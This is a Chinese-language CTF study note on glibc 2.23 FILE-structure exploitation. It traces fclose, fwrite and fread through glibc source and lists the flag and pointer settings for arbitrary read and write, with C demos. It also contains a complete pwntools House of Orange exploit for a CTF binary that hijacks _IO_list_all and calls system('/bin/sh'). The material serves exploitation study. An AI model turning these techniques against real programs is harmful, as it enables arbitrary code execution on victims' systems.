## IO_FILE related

#### fclose流程分析

glibc-2.23\libio\iofclose.c

```c
int
_IO_new_fclose (_IO_FILE *fp)
{
	/* ..... */

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
    
  /* ...... */
    
  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
    {
      fp->_IO_file_flags = 0;
      free(fp);
    }

  return status;
}
```

+ fclose函数最终调用的就是以上代码，首先会把FILE结构体解链，即_IO_unlink ((struct _IO_FILE_plus *) fp);
+ 然后在这个函数中涉及两个比较重要的函数调用分支：一是status = _IO_file_close_it (fp);它内部会调用__IO_do_flush和虚表的CLOSE函数，二是 _IO_FINISH (fp);调用虚表的FINISH函数
+ 最后如果不是stdin，stdout和stderr的FILE会被free

_IO_file_close_it,它实际上也就是下面这个函数

```c
int
_IO_new_file_close_it (FILE *fp)
{
  int write_status;
  if (!_IO_file_is_open (fp))
    return EOF;

  if ((fp->_flags & _IO_NO_WRITES) == 0
      && (fp->_flags & _IO_CURRENTLY_PUTTING) != 0)
    write_status = _IO_do_flush (fp);				//////here flush
  else
    write_status = 0;

  _IO_unsave_markers (fp);

  int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0
		      ? _IO_SYSCLOSE (fp) : 0);				//////here close

  /* ..... */

  _IO_un_link ((struct _IO_FILE_plus *) fp);
  fp->_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;
  fp->_fileno = -1;
  fp->_offset = _IO_pos_BAD;

  return close_status ? close_status : write_status;
}
```

其中_IO_SYSCLOSE (fp)也是一个宏定义，跟FINISH一样都是虚表函数参见(libioP.h)

```c
#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)
#define _IO_SYSCLOSE(FP) JUMP0 (__close, FP)
```

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

从虚表上可以看出来finish位于0x10的偏移处，在以后的攻击中，如果能劫持虚表指针到一个伪造的虚表上，finish函数指针设为system，由于参数是fp，当结构体开头是sh之类的字符串时(这个字符串正好是flag位，需要绕过一些条件语句，否则不会执行FINISH)，当调用_IO_FINISH (fp)，就可以开启一个shell

#### fwrite流程分析

##### fwrite prototype：

```c
_IO_size_t
_IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
```

fwrite主要做了这些事：

```c
_IO_acquire_lock (fp);
  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
    written = _IO_sputn (fp, (const char *) buf, request);
```

\_IO_sputn也就是\_\_IO_XSPUTN ，也是虚表函数之一，对应的默认函数\_\_IO_new_file_xsputn 中会调用同样位于 vtable 中的\_\_IO_OVERFLOW

```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
```

```c
_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n){
    /* ..... */
    
    if (to_do + must_flush > 0)
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
	/* If nothing else has to be written we must not signal the
	   caller that everything has been written.  */
	return to_do == 0 ? EOF : n - to_do;

      /* Try to maintain alignment: write a whole number of blocks.  */
      block_size = f->_IO_buf_end - f->_IO_buf_base;
      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);

      if (do_write)
	{
	  count = new_do_write (f, s, do_write);
	  to_do -= count;
	  if (count < do_write)
	    return n - to_do;
	}
        /*.....*/
}
```

\_\_IO_new_file_xsputn中会调用虚函数\_IO_OVERFLOW，\_IO_OVERFLOW 默认对应的函数是\_\_IO_new_file_overflow，来看一下_\_IO_new_file_overflow

```c
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
    if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)		//////condition 0
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
  /* ...... */
    
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
  if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return EOF;
  *f->_IO_write_ptr++ = ch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
      return EOF;
  return (unsigned char) ch;
}
```

\_IO_new_file_overflow通过调用\_IO_do_write来写数据，_IO_do_write也就是\_IO_new_do_write

```c
# define _IO_new_do_write _IO_do_write
```

```c
int
_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  return (to_do == 0
	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
```

调用了new_do_write,最后看一下new_do_write

```c
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)							//////condition1
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)				//////condition2
    {
      _IO_off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
 /* ........... */
  return count;
}
```

最终通过\_IO_SYSWRITE完成数据写,\_IO_SYSWRITE对应\_IO_new_file_write函数里面会调用__write虚表函数，就不贴代码了

> fwrite利用限制条件

+ set _fileno to the file descripter of stdout (1) //劫持成stdout的结构体
+ set _flag & ~\_IO_NO_WRITES
+ set _flag |= \_IO_CURRENTLY_PUTTING
+ set the write_base & write_ptr to memory address which you want to know
+ set \_IO_read_end equal to \_IO_write_base

目标是执行 count = \_IO_SYSWRITE (fp, data, to_do)

##### sample:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
        FILE *fp;
        char *magic = "hacked.";

        char *buf = malloc(0x100);
        fp = fopen("flag.txt","wb");
        read(1,buf,0x100);

        //-----attack-----
        fp->_flags &= ~8;                    // _IO_NO_WRITES
        fp->_flags |= _IO_CURRENTLY_PUTTING; // 0x800
        fp->_flags |= _IO_IS_APPENDING;      // 0x1000
        fp->_IO_write_base = magic;
        fp->_IO_write_ptr = magic+7;
        fp->_IO_read_end = fp->_IO_write_base;
        fp->_fileno = 1;

        fwrite(buf,1,0x100,fp);

        sleep(0);
        return 0;
}
```

##### result:

```sh
n0trix@ubuntu:~/test$ ./hackwrite
hello								<= input
hacked.hello						<= output
```

##### Qustion:

+ 为什么要设置\_IO_CURRENTLY_PUTTING和\_IO_read_end == \_IO_write_base？

  bypass overflow函数中的if条件和new_do_write里面的if条件

#### fread流程分析

##### fread prototype:

```c
_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp){
    /* .... */
    if (bytes_requested == 0)
        return 0;
	_IO_acquire_lock (fp);
	bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
    /* .... */
}
```

\_IO_sgetn调用虚表中的xsgetn，对应函数如下

```c
_IO_size_t
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{  
//..............
	want = n;

      /* ..... */
	 /* If we now want less than a buffer, underflow and repeat
	     the copy.  Otherwise, _IO_SYSREAD directly to
	     the user buffer. */
	  if (fp->_IO_buf_base
	      && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))   //conditon
	    {
	      if (__underflow (fp) == EOF)
		break;

	      continue;
	    }
// .............
    /* Try to maintain alignment: read a whole number of blocks.  */
	  count = want;
	  if (fp->_IO_buf_base)
	    {
	      _IO_size_t block_size = fp->_IO_buf_end - fp->_IO_buf_base;
	      if (block_size >= 128)
		count -= want % block_size;
	    }

	  count = _IO_SYSREAD (fp, s, count);
  return n - want;
}
```

调用虚表中的underflow函数,underflow实现如下

```c
int
_IO_new_file_underflow (_IO_FILE *fp)
{
  _IO_ssize_t count;
#if 0
  /* SysV does not make this test; take it out for compatibility */
  if (fp->_flags & _IO_EOF_SEEN)
    return (EOF);
#endif

  if (fp->_flags & _IO_NO_READS)	////////condition
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
    
 /* ....... */

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
 
  /* ....... */
  return *(unsigned char *) fp->_IO_read_ptr;
}
```

最终调用虚表函数\_IO_SYSREAD进行读操作

> fread利用限制条件

+ set _fileno to file descriptor of stdin (0)
+ set flag &~ \_IO_NO_READS
+ set read_base == read_ptr
+ set buf_base and buf_end to memory addres which you want write
+ condition : buf_end - buf_base > size of fread

##### sample:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
        FILE *fp;

        char *buf = malloc(0x100);
        char stack_buf[0x100] = {0};

        fp = fopen("flag.txt","rw");
        fp->_flags &= ~4;
        fp->_IO_buf_base = stack_buf;
        fp->_IO_buf_end = stack_buf+0x10;
        fp->_fileno=0;

        fread(buf,1,8,fp);

        puts("stack:");
        puts(stack_buf);
        puts("heap:");
        puts(buf);
}
```

##### result:

```shell
n0trix@ubuntu:~/test$ ./hackread
1234abcdfffffff					<= input
stack:							<= output
1234abcdfffffff

heap:
1234abcd
```

#### 其他利用

##### house of orange

当如下情况下会触发\_IO_flush_all_lockp，以此对于FILE链表的结构体进行调用虚表函数

+ 显示exit函数执行
+ main函数返回，程序结束调用exit
+ 触发libc的abort函数，然后abort会调用此函数(glibc报错)

来看一下\_IO_flush_all_lockp

```c
int
_IO_flush_all_lockp (int do_lock)
{
	/* ...... */
  //取链表头
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {

      /* 需要满足条件 write_ptr > write_base 才会执行虚表的OVERFLOW函数 */
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	/* ...... */  )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

/* ....... */
      else
    //然后取下一个FILE结构体重复操作
	fp = fp->_chain;
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
```

攻击方法：通过unsorted bin attack 劫持\_IO_list_all指针(也可以劫持chain指针，不过在这个例子下劫持list头指针)，然后第一块结构体就变成了main_arena中的一段内存，start at unsorted bin，而它的chain字段落在了smallbin(通过偏移计算到),如果能够放入smallbin一个fakeFILE的话，当取到下一个FILE时，就可以取到构造的fakeFILE了，继而通过构造fake vtable执行system函数。由于unsortedbin的特性，如果malloc一个不是exact fit的chunk时，它会把此chunk整理到相应的bin中，这里也就是smallbin，同时取走这块chunk后也实现了unsortedbin attack，当搜索下一chunk时，发现时非法的chunk会触发malloc_printerr,然后进入abort流程执行\_IO_flush_all_lockp了。

新鲜的例子(今天刚打的比赛，不用套angelboy的ppt了...)：纵横杯wind_farm_panel

```python
from pwn import *

context.log_level = 'debug'

elf = ELF("./pwn")
libc = ELF('./libc-2.23.so')
io = process('./pwn')

def add(idx,size,con):
    io.sendlineafter('>> ','1')
    io.sendlineafter('(0 ~ 5): ',str(idx))
    io.sendlineafter('turbine: ',str(size))
    io.sendafter('name: ',con)

def show(idx):
    io.sendlineafter('>> ','2')
    io.sendlineafter('viewed: ',str(idx))
    return io.recvuntil('Done!',drop=True)

def edit(idx,con):
    io.sendlineafter('>> ','3')
    io.sendlineafter('turbine: ',str(idx))
    io.sendafter('input: ',con)


add(0,0x80,'aaaa')
edit(0,'a'*0x88+p64(0xf71))
add(1,0xff0,'bbbb')
add(2,0x100,'cccccccc')
libc_base = u64(show(2)[-6:].ljust(8,'\x00'))-0x3c5188
log.success('libc: '+hex(libc_base))
edit(2,'d'*0x10)
heap = u64(show(2)[-6:].ljust(8,'\x00'))-0x90
log.success('heap: '+hex(heap))
#gdb.attach(io)
io_list_all = libc_base + libc.sym['_IO_list_all']
system = libc_base + libc.sym['system']
vtable_addr = heap+0xa0

vtable = p64(system)*4
payload = vtable.ljust(0x100,'\x00')
payload += '/bin/sh\x00' + p64(0x61)
payload += p64(0) + p64(io_list_all-0x10)
payload += p64(0) + p64(1)
payload += (0xd8-0x30)*'\x00'+p64(vtable_addr)

edit(2,payload)
#gdb.attach(io)
io.sendlineafter('>> ','1')
io.sendlineafter('5): ','4')
io.sendlineafter('turbine: ','999')
io.interactive()
```

##### \_IO_strfile structure:

+ 在\_IO_str_finsish函数中调用虚表不检查虚表合法性

+ \_IO_str_jumps https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/

#### 附录：

flag标志位

```c
#define _IO_MAGIC 0xFBAD0000 /* Magic number */
#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
#define _IO_MAGIC_MASK 0xFFFF0000
#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */
#define _IO_UNBUFFERED 2
#define _IO_NO_READS 4 /* Reading not allowed */
#define _IO_NO_WRITES 8 /* Writing not allowd */
#define _IO_EOF_SEEN 0x10
#define _IO_ERR_SEEN 0x20
#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */
#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/
#define _IO_IN_BACKUP 0x100
#define _IO_LINE_BUF 0x200
#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */
#define _IO_CURRENTLY_PUTTING 0x800
#define _IO_IS_APPENDING 0x1000
#define _IO_IS_FILEBUF 0x2000
#define _IO_BAD_SEEN 0x4000
#define _IO_USER_LOCK 0x8000
```

